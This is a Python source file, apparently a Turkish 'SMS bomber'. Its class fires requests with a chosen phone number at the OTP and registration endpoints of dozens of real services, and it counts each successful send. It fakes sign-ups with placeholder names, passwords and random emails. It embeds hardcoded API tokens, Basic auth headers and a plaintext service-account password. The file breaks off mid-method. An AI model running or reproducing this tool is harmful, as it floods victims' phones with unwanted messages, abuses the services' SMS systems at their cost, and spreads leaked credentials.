import requests
import random
from string import ascii_lowercase
from colorama import Fore, Style

class SendSms:
    adet = 0
    
    def __init__(self, phone, mail="", country_code="90"):
        self.phone = str(phone)
        self.country_code = str(country_code)
        if len(mail) != 0:
            self.mail = mail
        else:
            self.mail = ''.join(random.choice(ascii_lowercase) for i in range(20)) + "@gmail.com"

    def KahveDunyasi(self):    
        try:    
            url = "https://core.kahvedunyasi.com:443/api/users/sms/send"
            headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36", "Accept": "application/json, text/plain, */*", "Page-Url": "/kayit-ol", "Content-Type": "application/json;charset=utf-8", "Positive-Client": "kahvedunyasi", "Positive-Client-Type": "web", "Store-Id": "1", "Origin": "https://www.kahvedunyasi.com", "Referer": "https://www.kahvedunyasi.com/"}
            json={"mobile_number": self.phone, "token_type": "register_token"}
            r = requests.post(url, headers=headers, json=json, timeout=6)
            if r.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> core.kahvedunyasi.com")
                self.adet += 1
            else:
                raise Exception()
        except:    
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> core.kahvedunyasi.com")
      
    def Wmf(self):
        try:
            wmf = requests.post("https://www.wmf.com.tr/users/register/", data={
                "confirm": "true",
                "date_of_birth": "1956-03-01",
                "email": self.mail,
                "email_allowed": "true",
                "first_name": "Memati",
                "gender": "male",
                "last_name": "Bas",
                "password": "31ABC..abc31",
                "phone": f"0{self.phone}"
            }, timeout=6)
            if wmf.status_code == 202:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> wmf.com.tr")
                self.adet += 1    
            else:
                raise Exception()
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> wmf.com.tr")
      
    def Bim(self):
        try:
            bim = requests.post("https://bim.veesk.net:443/service/v1.0/account/login", json={"phone": self.phone}, timeout=6)
            if bim.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> bim.veesk.net")
                self.adet += 1
            else:
                raise Exception()
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> bim.veesk.net")

    def Englishhome(self):
        try:
            url = "https://www.englishhome.com:443/api/member/sendOtp"
            headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36", "Accept": "*/*", "Referer": "https://www.englishhome.com/", "Content-Type": "application/json", "Origin": "https://www.englishhome.com"}
            json={"Phone": f"+{self.country_code}"+self.phone}
            r = requests.post(url, headers=headers, json=json, timeout=6)
            if r.json().get("isError") == False:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> englishhome.com")
                self.adet += 1
            else:
                raise Exception()
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> englishhome.com")

    def Icq(self):
        try:
            url = f"https://u.icq.net:443/api/v90/smsreg/requestPhoneValidation.php?client=icq&f=json&k=gu19PNBblQjCdbMU&locale=en&msisdn=%2B{self.country_code}{self.phone}&platform=ios&r=796356153&smsFormatType=human"
            headers = {"Accept": "*/*", "Content-Type": "application/x-www-form-urlencoded", "User-Agent": "ICQ iOS"}
            r = requests.post(url, headers=headers, timeout=6)
            if r.json()["response"]["statusCode"] == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> u.icq.net")
                self.adet += 1
            else:
                raise Exception()
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> u.icq.net")

    def Suiste(self):
        try:
            url = "https://suiste.com:443/api/auth/code"
            headers = {"Accept": "application/json", "Content-Type": "application/x-www-form-urlencoded; charset=utf-8", "Mobillium-Device-Id": "56DB9AC4-F52B-4DF1-B14C-E39690BC69FC", "User-Agent": "suiste/1.6.16"}
            data = {"action": "register", "gsm": self.phone}
            r = requests.post(url, headers=headers, data=data, timeout=6)
            if r.json()["code"] == "common.success":
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> suiste.com")
                self.adet += 1
            else:
                raise Exception()
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> suiste.com")
                
    def KimGb(self):
        try:
            r = requests.post("https://3uptzlakwi.execute-api.eu-west-1.amazonaws.com:443/api/auth/send-otp", json={"msisdn": f"{self.country_code}{self.phone}"}, timeout=6)
            if r.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> 3uptzlakwi.execute-api.eu-west-1.amazonaws.com")
                self.adet += 1
            else:
                raise Exception()
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> 3uptzlakwi.execute-api.eu-west-1.amazonaws.com")

    def Tazi(self):
        try:
            url = "https://mobileapiv2.tazi.tech:443/C08467681C6844CFA6DA240D51C8AA8C/uyev2/smslogin"
            headers = {"Accept": "application/json, text/plain, */*", "Content-Type": "application/json;charset=utf-8", "User-Agent": "Taz%C4%B1/3", "Authorization": "Basic dGF6aV91c3Jfc3NsOjM5NTA3RjI4Qzk2MjRDQ0I4QjVBQTg2RUDxOUE4MDFD"}
            json={"cep_tel": self.phone, "cep_tel_ulkekod": self.country_code}
            r = requests.post(url, headers=headers, json=json, timeout=6)
            if (r.json()["kod"]) == "0000":
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> mobileapiv2.tazi.tech")
                self.adet += 1
            else:
                raise Exception()
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> mobileapiv2.tazi.tech")

    def Evidea(self):
        try:
            url = "https://www.evidea.com:443/users/register/"
            headers = {"Content-Type": "multipart/form-data; boundary=fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi", "X-Requested-With": "XMLHttpRequest", "User-Agent": "Evidea/1"}
            data = f"--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"first_name\"\r\n\r\nMemati\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"last_name\"\r\n\r\nBas\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"email\"\r\n\r\n{self.mail}\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"email_allowed\"\r\n\r\nfalse\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"sms_allowed\"\r\n\r\ntrue\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"password\"\r\n\r\n31ABC..abc31\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"phone\"\r\n\r\n0{self.phone}\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"confirm\"\r\n\r\ntrue\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi--\r\n"
            r = requests.post(url, headers=headers, data=data, timeout=6)      
            if r.status_code == 202:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> evidea.com")
                self.adet += 1
            else:
                raise Exception()
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> evidea.com")  

    def Hey(self):
        try:
            url = f"https://heyapi.heymobility.tech:443/V14//api/User/ActivationCodeRequest?organizationId=9DCA312E-18C8-4DAE-AE65-01FEAD558739&phonenumber={self.phone}&requestid=18bca4e4-2f45-41b0-b054-3efd5b2c9c57-20230730&territoryId=738211d4-fd9d-4168-81a6-b7dbf91170e9"
            headers = {"User-Agent": "HEY!%20Scooter/143"}
            r = requests.post(url, headers=headers, timeout=6)
            if r.json().get("IsSuccess") == True:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> heyapi.heymobility.tech")
                self.adet += 1
            else:
                raise Exception()
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> heyapi.heymobility.tech")

    def Bisu(self):
        try:
            url = "https://www.bisu.com.tr:443/api/v2/app/authentication/phone/register"
            headers = {"Content-Type": "application/x-www-form-urlencoded; charset=utf-8", "User-Agent": "BiSU/22"}
            data = {"phoneNumber": self.phone}
            r = requests.post(url, headers=headers, data=data, timeout=6)
            if r.json().get("errors") == None:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> bisu.com.tr")
                self.adet += 1
            else:
                raise Exception()
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> bisu.com.tr")

    def Ucdortbes(self):
        try:
            url = "https://api.345dijital.com:443/api/users/register"
            headers = {"Content-Type": "application/json", "User-Agent": "AriPlusMobile/21"}
            json={"email": "", "name": "Memati", "phoneNumber": f"+{self.country_code}{self.phone}", "surname": "Bas"}
            r = requests.post(url, headers=headers, json=json, timeout=6)
            if r.json().get("error") == "E-Posta veya telefon zaten kayıtlı!":
                raise Exception()
            else:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> api.345dijital.com")
                self.adet += 1
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> api.345dijital.com")

    def Macro(self):
        try:
            url = "https://www.macrocenter.com.tr:443/rest/users/register/otp?reid=31"
            headers = {"Content-Type": "application/json", "Origin": "https://www.macrocenter.com.tr"}
            json={"email": self.mail, "phoneNumber": self.phone}
            r = requests.post(url, headers=headers, json=json, timeout=6)
            if r.json().get("successful") == True:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> macrocenter.com.tr")
                self.adet += 1
            else:
                raise Exception()
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> macrocenter.com.tr")

    def TiklaGelsin(self):
        try:
            url = "https://svc.apps.tiklagelsin.com:443/user/graphql"
            headers = {"Content-Type": "application/json", "User-Agent": "TiklaGelsin/809"}
            json={"operationName": "GENERATE_OTP", "query": "mutation GENERATE_OTP($phone: String, $challenge: String, $deviceUniqueId: String) {\n  generateOtp(phone: $phone, challenge: $challenge, deviceUniqueId: $deviceUniqueId)\n}\n", "variables": {"challenge": "3d6f9ff9-86ce-4bf3-8ba9-4a85ca975e68", "deviceUniqueId": "720932D5-47BD-46CD-A4B8-086EC49F81AB", "phone": f"+{self.country_code}{self.phone}"}}
            r = requests.post(url, headers=headers, json=json, timeout=6)
            if r.json()["data"]["generateOtp"] == True:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> svc.apps.tiklagelsin.com")
                self.adet += 1
            else:
                raise Exception()
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> svc.apps.tiklagelsin.com")

    def Ayyildiz(self):
        try:
            url = f"https://api.altinyildizclassics.com:443/mobileapi2/autapi/CreateSmsOtpForRegister?gsm={self.phone}"
            headers = {"Token": "MXZ5NTJ82WXBUJB7KBP10AGR3AF6S4GB95VZDU4G44JFEIN3WISAC2KLRIBNONQ7QVCZXM3ZHI661AMVXLKJLF9HUKI5SQ2ROMZS", "User-Agent": "altinyildiz/2.7"}
            r = requests.post(url, headers=headers, timeout=6)
            if r.json().get("Success") == True:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> api.altinyildizclassics.com")
                self.adet += 1
            else:
                raise Exception()
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> api.altinyildizclassics.com")

    def Naosstars(self):
        try:
            url = "https://api.naosstars.com:443/api/smsSend/9c9fa861-cc5d-43b0-b4ea-1b541be15350"
            headers = {"Content-Type": "application/json; charset=utf-8", "User-Agent": "naosstars/1.0030"}
            json={"telephone": f"+{self.country_code}{self.phone}", "type": "register"}
            r = requests.post(url, headers=headers, json=json, timeout=6)
            if r.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> api.naosstars.com")
                self.adet += 1
            else:
                raise Exception()
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> api.naosstars.com")

    def Istegelsin(self):
        try:
            url = "https://prod.fasapi.net:443/"
            headers = {"Content-Type": "application/x-www-form-urlencoded", "User-Agent": "ig-sonkullanici-ios/161"}
            json={"operationName": "SendOtp2", "query": "mutation SendOtp2($phoneNumber: String!) {\n  sendOtp2(phoneNumber: $phoneNumber) {\n    __typename\n    alreadySent\n    remainingTime\n  }\n}", "variables": {"phoneNumber": f"{self.country_code}{self.phone}"}}
            r = requests.post(url, headers=headers, json=json, timeout=6)
            if r.json()["data"]["sendOtp2"]["alreadySent"] == False:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> prod.fasapi.net")
                self.adet += 1
            else:
                raise Exception()
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> prod.fasapi.net")

    def Koton(self):
        try:
            url = "https://www.koton.com:443/users/register/"
            headers = {"Content-Type": "multipart/form-data; boundary=sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk", "User-Agent": "Koton/1"}
            data = f"--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"first_name\"\r\n\r\nMemati\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"last_name\"\r\n\r\nBas\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"email\"\r\n\r\n{self.mail}\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"password\"\r\n\r\n31ABC..abc31\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"phone\"\r\n\r\n0{self.phone}\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"confirm\"\r\n\r\ntrue\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"sms_allowed\"\r\n\r\ntrue\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk--\r\n"
            r = requests.post(url, headers=headers, data=data, timeout=6)
            if r.status_code == 202:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> koton.com")
                self.adet += 1
            else:
                raise Exception()
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> koton.com")

    def Hayatsu(self):
        try:
            url = "https://api.hayatsu.com.tr:443/api/SignUp/SendOtp"
            headers = {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"}
            data = {"mobilePhoneNumber": self.phone, "actionType": "register"}
            r = requests.post(url, headers=headers, data=data, timeout=6)
            if r.json().get("is_success") == True:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> api.hayatsu.com.tr")
                self.adet += 1
            else:
                raise Exception()
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> api.hayatsu.com.tr")

    def Hizliecza(self):
        try:
            url = "https://hizlieczaprodapi.hizliecza.net:443/mobil/account/sendOTP"
            headers = {"Content-Type": "application/json", "User-Agent": "hizliecza/12"}
            json={"otpOperationType": 2, "phoneNumber": f"+{self.country_code}{self.phone}"}
            r = requests.post(url, headers=headers, json=json, timeout=6)
            if r.json().get("isSuccess") == True:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> hizlieczaprodapi.hizliecza.net")
                self.adet += 1
            else:
                raise Exception()
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> hizlieczaprodapi.hizliecza.net")

    def Ipragaz(self):
        try:
            url = "https://ipapp.ipragaz.com.tr:443/ipragazmobile/v2/ipragaz-b2c/ipragaz-customer/mobile-register-otp"
            headers = {"Content-Type": "application/json"}
            json={"birthDate": "2/7/2000", "carPlate": "31 ABC 31", "mobileOtp": "f32c79e65cc684a14b15dcb9dc7e9e9d92b2f6d269fd9000a7b75e02cfd8fa63", "name": "Memati Bas", "otp": "", "phoneNumber": self.phone, "playerId": ""}
            r = requests.post(url, headers=headers, json=json, timeout=6)
            if r.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> ipapp.ipragaz.com.tr")
                self.adet += 1
            else:
                raise Exception()
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> ipapp.ipragaz.com.tr")

    def Metro(self):
        try:
            url = "https://feature.metro-tr.com:443/api/mobileAuth/validateSmsSend"
            headers = {"Content-Type": "application/json; charset=utf-8"}
            json={"methodType": "2", "mobilePhoneNumber": f"+{self.country_code}{self.phone}"}
            r = requests.post(url, headers=headers, json=json, timeout=6)
            if r.json().get("status") == "success":
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> feature.metro-tr.com")
                self.adet += 1
            else:
                raise Exception()
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> feature.metro-tr.com")

    def Qumpara(self):
        try:
            url = "https://tr-api.fisicek.com:443/v1.3/auth/getOTP"
            headers = {"Content-Type": "application/json"}
            json={"msisdn": f"+{self.country_code}{self.phone}"}
            r = requests.post(url, headers=headers, json=json, timeout=6)
            if r.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> tr-api.fisicek.com")
                self.adet += 1
            else:
                raise Exception()
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> tr-api.fisicek.com")

    def Paybol(self):
        try:
            url = "https://pyb-mobileapi.walletgate.io:443/v1/Account/RegisterPersonalAccountSendOtpSms"
            headers = {"Content-Type": "application/json"}
            json={"phone_number": f"{self.country_code}{self.phone}"}
            r = requests.post(url, headers=headers, json=json, timeout=6)
            if r.json().get("status") == 0:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> pyb-mobileapi.walletgate.io")
                self.adet += 1
            else:
                raise Exception()
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> pyb-mobileapi.walletgate.io")

    def Migros(self):
        try:
            url = "https://rest.migros.com.tr:443/sanalmarket/users/register/otp"
            headers = {"Content-Type": "application/json"}
            json={"email": self.mail, "phoneNumber": self.phone}
            r = requests.post(url, headers=headers, json=json, timeout=6)
            if r.json().get("successful") == True:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> rest.migros.com.tr")
                self.adet += 1
            else:
                raise Exception()
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> rest.migros.com.tr")

    def File(self):
        try:
            url = "https://api.filemarket.com.tr:443/v1/otp/send"
            headers = {"Content-Type": "application/json"}
            json={"mobilePhoneNumber": f"{self.country_code}{self.phone}"}
            r = requests.post(url, headers=headers, json=json, timeout=6)
            if r.json().get("responseType") == "SUCCESS":
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> api.filemarket.com.tr")
                self.adet += 1
            else:
                raise Exception()
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> api.filemarket.com.tr")

    def Joker(self):
        try:
            url = "https://api.joker.com.tr:443/api/register"
            headers = {"Content-Type": "application/json"}
            json={"firstName": "Memati", "gender": "m", "iosVersion": "4.0.2", "lastName": "Bas", "os": "IOS", "password": "31ABC..abc31", "phoneNumber": f"0{self.phone}", "username": self.mail}
            r = requests.post(url, headers=headers, json=json, timeout=6)
            if r.json().get("message") == "Doğrulama kodu gönderildi.":
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> api.joker.com.tr")
                self.adet += 1
            else:
                raise Exception()
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> api.joker.com.tr")

    def Akasya(self):
        try:
            url = "https://akasya-admin.poilabs.com:443/v1/tr/sms"
            headers = {"Content-Type": "application/json", "X-Platform-Token": "9f493307-d252-4053-8c96-62e7c90271f5"}
            json={"phone": self.phone}
            r = requests.post(url=url, headers=headers, json=json, timeout=6)
            if r.json().get("result") == "SMS sended succesfully!":
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> akasya-admin.poilabs.com")
                self.adet += 1
            else:
                raise Exception()
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> akasya-admin.poilabs.com")

    def Akbati(self):
        try:
            url = "https://akbati-admin.poilabs.com:443/v1/tr/sms"
            headers = {"Content-Type": "application/json", "X-Platform-Token": "a2fe21af-b575-4cd7-ad9d-081177c239a3"}
            json={"phone": self.phone}
            r = requests.post(url=url, headers=headers, json=json, timeout=6)
            if r.json().get("result") == "SMS sended succesfully!":
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> akbati-admin.poilabs.com")
                self.adet += 1
            else:
                raise Exception()
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> akbati-admin.poilabs.com")

    def Clickme(self):
        try:
            url = "https://mobile-gateway.clickmelive.com:443/api/v2/authorization/code"
            headers = {"Content-Type": "application/json", "Authorization": "apiKey 617196fc65dc0778fb59e97660856d1921bef5a092bb4071f3c071704e5ca4cc"}
            json={"phone": self.phone}
            r = requests.post(url=url, json=json, headers=headers, timeout=6)
            if r.json().get("isSuccess") == True:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> mobile-gateway.clickmelive.com")
                self.adet += 1
            else:
                raise Exception()
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> mobile-gateway.clickmelive.com")

    def Happy(self):
        try:
            url = "https://www.happy.com.tr:443/index.php?route=account/register/verifyPhone"
            headers = {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"}
            data = {"telephone": self.phone}
            r = requests.post(url=url, data=data, headers=headers, timeout=6)
            if r.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> happy.com.tr")
                self.adet += 1
            else:
                raise Exception()
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> happy.com.tr")

    def Komagene(self):
        try:
            url = "https://gateway.komagene.com.tr/auth/auth/smskodugonder"
            json={"Telefon": self.phone, "FirmaId": "32"}
            r = requests.post(url=url, json=json, timeout=6)
            if r.json().get("Success") == True:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> gateway.komagene.com.tr")
                self.adet += 1
            else:
                raise Exception()
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> gateway.komagene.com.tr")

    def KuryemGelsin(self):
        try:
            url = "https://api.kuryemgelsin.com:443/tr/api/users/registerMessage/"
            json={"phoneNumber": self.phone, "phone_country_code": f"+{self.country_code}"}
            r = requests.post(url=url, json=json, timeout=6)
            if r.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> api.kuryemgelsin.com")
                self.adet += 1
            else:
                raise Exception()
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> api.kuryemgelsin.com")

    def Porty(self):
        try:
            url = "https://panel.porty.tech:443/api.php?"
            headers = {"Content-Type": "application/json; charset=UTF-8", "Token": "q2zS6kX7WYFRwVYArDdM66x72dR6hnZASZ"}
            json={"job": "start_login", "phone": self.phone}
            r = requests.post(url=url, json=json, headers=headers, timeout=6)
            if r.json().get("status") == "success":
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> panel.porty.tech")
                self.adet += 1
            else:
                raise Exception()
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> panel.porty.tech")

    def Taksim(self):
        try:
            url = "https://service.taksim.digital:443/services/PassengerRegister/Register"
            headers = {"Content-Type": "application/json; charset=UTF-8", "Token": "gcAvCfYEp7d//rR5A5vqaFB/Ccej7O+Qz4PRs8LwT4E="}
            json={"countryPhoneCode": f"+{self.country_code}", "name": "Memati", "phoneNo": self.phone, "surname": "Bas"}
            r = requests.post(url=url, headers=headers, json=json, timeout=6)
            if r.json().get("success") == True:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> service.taksim.digital")
                self.adet += 1
            else:
                raise Exception()
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> service.taksim.digital")

    def Tasdelen(self):
        try:
            url = "http://94.102.66.162:80/MobilServis/api/MobilOperation/CustomerPhoneSmsSend"
            json= {"PhoneNumber": self.phone, "user": {"Password": "Aa123!35@1","UserName": "MobilOperator"}}
            r = requests.post(url=url, json=json, timeout=6)
            if r.json().get("Result") == True:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> 94.102.66.162:80")
                self.adet += 1
            else:
                raise Exception()
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> 94.102.66.162:80")

    def Tasimacim(self):
        try:
            url = "https://server.tasimacim.com/requestcode"
            json= {"phone": self.phone, "lang": "tr"}
            r = requests.post(url=url, json=json, timeout=6)
            if r.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> server.tasimacim.com")
                self.adet += 1
            else:
                raise Exception()
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> server.tasimacim.com")

    def ToptanTeslim(self):
        try:
            url = "https://toptanteslim.com:443/Services/V2/MobilServis.aspx"
            headers = {"Content-Type": "application/x-www-form-urlencoded"}
            json={"ADRES": "ZXNlZGtm", "DIL": "tr_TR", "EPOSTA": self.mail, "EPOSTA_BILDIRIM": True, "ILCE": "BAŞAKŞEHİR", "ISLEM": "KayitOl", "ISTEMCI": "BEABC9B2-A58F-3131-AF46-2FF404F79677", "KIMLIKNO": None, "KULLANICI_ADI": "Memati", "KULLANICI_SOYADI": "Bas", "PARA_BIRIMI": "TL", "PAROLA": "312C6383DE1465D08F635B6121C1F9B4", "POSTAKODU": "377777", "SEHIR": "İSTANBUL", "SEMT": "BAŞAKŞEHİR MAH.", "SMS_BILDIRIM": True, "TELEFON": self.phone, "TICARI_UNVAN": "kdkd", "ULKE_ID": 1105, "VERGI_DAIRESI": "sjje", "VERGI_NU": ""}
            r = requests.post(url, headers=headers, json=json, timeout=6)
            if r.json().get("Durum") == True:
